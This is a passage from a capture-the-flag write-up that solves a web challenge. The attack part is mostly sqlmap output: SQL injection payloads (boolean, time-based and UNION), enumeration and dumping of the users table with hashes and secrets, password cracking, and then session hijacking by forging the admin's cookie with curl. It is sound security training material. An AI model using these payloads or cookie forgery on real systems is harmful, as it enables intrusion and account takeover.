[13:12:11] [INFO] testing 'MySQL = 5.0.12 AND time-based blind'
[13:12:22] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
[13:12:22] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[13:12:22] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[13:12:23] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[13:12:24] [INFO] target URL appears to have 6 columns in query
[13:12:29] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 71 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=2' AND 9974=9974 AND 'Xjtp'='Xjtp
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: id=2' AND SLEEP(5) AND 'BISW'='BISW
    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=-1437' UNION ALL SELECT NULL,NULL,CONCAT(0x71766b7871,0x7976526e7667585057775948464a614a44427758585a6442564e75716b434452534247514b516a43,0x716b7a6271),NULL,NULL,NULL-- QTjl
---
[13:12:34] [INFO] the back-end DBMS is MySQL
web application technology: Nginx
back-end DBMS: MySQL >= 5.0.12
[13:12:34] [INFO] fetched data logged to text files under '/root/.sqlmap/output/web6.tamuctf.com'
[*] shutting down at 13:12:34
```
SQLMap confirmed that the service is vulnerable. Let's extract the data:
```console
root@kali:/media/sf_CTFs/tamu/1337_Secur1ty# sqlmap -u http://web6.tamuctf.com/message?id=2 --dbs
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.2.5#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] starting at 13:13:54
[13:13:54] [INFO] resuming back-end DBMS 'mysql'
[13:13:54] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=2' AND 9974=9974 AND 'Xjtp'='Xjtp
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: id=2' AND SLEEP(5) AND 'BISW'='BISW
    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=-1437' UNION ALL SELECT NULL,NULL,CONCAT(0x71766b7871,0x7976526e7667585057775948464a614a44427758585a6442564e75716b434452534247514b516a43,0x716b7a6271),NULL,NULL,NULL-- QTjl
---
[13:13:55] [INFO] the back-end DBMS is MySQL
web application technology: Nginx
back-end DBMS: MySQL >= 5.0.12
[13:13:55] [INFO] fetching database names
[13:13:55] [INFO] used SQL query returns 2 entries
[13:13:55] [INFO] retrieved: information_schema
[13:13:56] [INFO] retrieved: 1337_Secur1ty
available databases [2]:
[*] 1337_Secur1ty
[*] information_schema
[13:13:56] [INFO] fetched data logged to text files under '/root/.sqlmap/output/web6.tamuctf.com'
[*] shutting down at 13:13:56
root@kali:/media/sf_CTFs/tamu/1337_Secur1ty# sqlmap -u http://web6.tamuctf.com/message?id=2 -D 1337_Secur1ty --tables
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.2.5#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] starting at 13:14:21
[13:14:21] [INFO] resuming back-end DBMS 'mysql'
[13:14:21] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=2' AND 9974=9974 AND 'Xjtp'='Xjtp
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: id=2' AND SLEEP(5) AND 'BISW'='BISW
    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=-1437' UNION ALL SELECT NULL,NULL,CONCAT(0x71766b7871,0x7976526e7667585057775948464a614a44427758585a6442564e75716b434452534247514b516a43,0x716b7a6271),NULL,NULL,NULL-- QTjl
---
[13:14:22] [INFO] the back-end DBMS is MySQL
web application technology: Nginx
back-end DBMS: MySQL >= 5.0.12
[13:14:22] [INFO] fetching tables for database: '1337_Secur1ty'
[13:14:22] [INFO] used SQL query returns 2 entries
[13:14:22] [INFO] retrieved: Messages
[13:14:22] [INFO] retrieved: Users
Database: 1337_Secur1ty
[2 tables]
+----------+
| Messages |
| Users    |
+----------+
[13:14:23] [INFO] fetched data logged to text files under '/root/.sqlmap/output/web6.tamuctf.com'
[*] shutting down at 13:14:23
root@kali:/media/sf_CTFs/tamu/1337_Secur1ty# sqlmap -u http://web6.tamuctf.com/message?id=2 -D 1337_Secur1ty -T Users --dump
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.2.5#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] starting at 13:14:47
[13:14:47] [INFO] resuming back-end DBMS 'mysql'
[13:14:48] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=2' AND 9974=9974 AND 'Xjtp'='Xjtp
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: id=2' AND SLEEP(5) AND 'BISW'='BISW
    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=-1437' UNION ALL SELECT NULL,NULL,CONCAT(0x71766b7871,0x7976526e7667585057775948464a614a44427758585a6442564e75716b434452534247514b516a43,0x716b7a6271),NULL,NULL,NULL-- QTjl
---
[13:14:48] [INFO] the back-end DBMS is MySQL
web application technology: Nginx
back-end DBMS: MySQL >= 5.0.12
[13:14:48] [INFO] fetching columns for table 'Users' in database '1337_Secur1ty'
[13:14:48] [INFO] used SQL query returns 10 entries
[13:14:49] [INFO] retrieved: "UserID","int(9)"
[13:14:49] [INFO] retrieved: "Username","varchar(20)"
[13:14:49] [INFO] retrieved: "Password","varchar(50)"
[13:14:50] [INFO] retrieved: "FirstName","varchar(10)"
[13:14:50] [INFO] retrieved: "LastName","varchar(15)"
[13:14:50] [INFO] retrieved: "Phone","varchar(10)"
[13:14:51] [INFO] retrieved: "Email","varchar(37)"
[13:14:51] [INFO] retrieved: "Description","varchar(200)"
[13:14:51] [INFO] retrieved: "CreateDate","datetime"
[13:14:52] [INFO] retrieved: "Secret","varchar(50)"
[13:14:52] [INFO] fetching entries for table 'Users' in database '1337_Secur1ty'
[13:14:52] [INFO] used SQL query returns 3 entries
[13:14:52] [INFO] retrieved: "2019-03-09 11:02:22","Most secure admin to ever grace existence.","PI:EMAIL","Joe","Joeson","02ca0b0603222a090fe2fbf3ba97d90c","","W...
[13:14:53] [INFO] retrieved: "2019-03-09 11:02:22","That random intern.","PI:EMAIL","Bob","Bobson","fc8b8be2abe4a79bf6f36eee484c1f08","","4VCLO52ALSUUO5OM","2","Sc...
[13:14:53] [INFO] retrieved: "2019-03-09 11:06:15","","PI:EMAIL","a","a","0cc175b9c0f1b6a831c399e269772661","1234567891","TKH4FPK7FOEXG7VW","3","aa"
[13:14:53] [INFO] recognized possible password hashes in column 'Password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[13:15:03] [INFO] writing hashes to a temporary file '/tmp/sqlmaprdJTp31805/sqlmaphashes-Awosz3.txt'
do you want to crack them via a dictionary-based attack? [Y/n/q] y
[13:15:07] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/txt/wordlist.zip' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
>
[13:15:13] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] n
[13:15:18] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[13:15:18] [WARNING] multiprocessing hash cracking is currently not supported on this platform
[13:15:27] [INFO] cracked password 'a' for user 'aa'
Database: 1337_Secur1ty
Table: Users
[3 entries]
+--------+------------+-----------------------------+------------------+------------+----------+--------------------------------------+-----------+---------------------+--------------------------------------------+
| UserID | Phone      | Email                       | Secret           | Username   | LastName | Password                             | FirstName | CreateDate          | Description                                |
+--------+------------+-----------------------------+------------------+------------+----------+--------------------------------------+-----------+---------------------+--------------------------------------------+
| 1      |     | PI:EMAIL | WIFHXDZ3BOHJMJSC | 1337-admin | Joeson   | 02ca0b0603222a090fe2fbf3ba97d90c     | Joe       | 2019-03-09 11:02:22 | Most secure admin to ever grace existence. |
| 2      |     | PI:EMAIL  | 4VCLO52ALSUUO5OM | ScrubLord  | Bobson   | fc8b8be2abe4a79bf6f36eee484c1f08     | Bob       | 2019-03-09 11:02:22 | That random intern.                        |
| 3      | 1234567891 | PI:EMAIL         | TKH4FPK7FOEXG7VW | aa         | a        | 0cc175b9c0f1b6a831c399e269772661 (a) | a         | 2019-03-09 11:06:15 |                                     |
+--------+------------+-----------------------------+------------------+------------+----------+--------------------------------------+-----------+---------------------+--------------------------------------------+
[13:16:09] [INFO] table '`1337_Secur1ty`.Users' dumped to CSV file '/root/.sqlmap/output/web6.tamuctf.com/dump/1337_Secur1ty/Users.csv'
[13:16:09] [INFO] fetched data logged to text files under '/root/.sqlmap/output/web6.tamuctf.com'
[*] shutting down at 13:16:09
```
We have the username, secret and hash of the password for each of the users. SQLMap was even able to crack the hash of our user. So if we can crack the hash of the admin, we have everything we need in order to sign in as admins ourselves. 
But is there an easier way? What if we replace our cookie values with the admin's values?
```console
root@kali:/media/sf_CTFs/tamu/1337_Secur1ty# curl --cookie "secret=WIFHXDZ3BOHJMJSC;userid=1" http://web6.tamuctf.com/
...
                Name: Joe Joeson
                Username: 1337-admin
                Phone: *
                Email: PI:EMAIL
                Account Created On: 03/09/19 11:02
                Description: Most secure admin to ever grace existence.
                Flag: gigem{th3_T0tp_1s_we4k_w1tH_yoU}                       
...
root@kali:/media/sf_CTFs/tamu/1337_Secur1ty# curl -s --cookie "secret=WIFHXDZ3BOHJMJSC;userid=1" http://web6.tamuctf.com/ | egrep -o "gigem{[^}]+}"
gigem{th3_T0tp_1s_we4k_w1tH_yoU}
```
Looks like breaking the hash wasn't needed at all (although it wasn't a hard task either - `02ca0b0603222a090fe2fbf3ba97d90c = md5(secretpasscode)`).